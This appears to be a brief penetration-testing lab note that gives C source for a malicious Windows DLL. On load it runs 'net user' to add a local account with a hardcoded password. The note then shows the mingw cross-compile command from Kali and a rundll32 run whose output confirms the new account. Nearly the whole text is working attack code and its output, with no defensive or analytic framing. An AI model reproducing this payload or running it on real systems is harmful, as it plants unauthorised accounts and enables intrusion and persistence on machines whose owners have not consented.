We will use this code, save file as adduser.c

	#include <windows.h>

	void exec(void) {
		system("net user adduser Pass123! /add");
		return;
	}

	BOOL WINAPI DllMain(
		HINSTANCE hinstDLL,
		DWORD fdwReason, 
		LPVOID lpReserved )
	{
		switch( fdwReason ) 
		{ 
			case DLL_PROCESS_ATTACH:
			   exec(); 
			   break;

			case DLL_THREAD_ATTACH:
				break;

			case DLL_THREAD_DETACH:
				break;

			case DLL_PROCESS_DETACH:
				break;
		}
		return TRUE;
	}

Compile dll

	┌──(kali㉿kali)-[~/Desktop]
	└─$ i686-w64-mingw32-gcc -shared adduser.c -o adduser.dll

Run dll with elevated command line 

	PS C:\Users\testuser\Desktop> net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	Administrator            DefaultAccount           Guest
	nightmare                WDAGUtilityAccount       win10
	The command completed successfully.

	PS C:\Users\testuser\Desktop> rundll32.exe .\adduser.dll,exec
	PS C:\Users\testuser\Desktop> net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	adduser                  Administrator            DefaultAccount
	Guest                    nightmare                WDAGUtilityAccount
	win10
	The command completed successfully.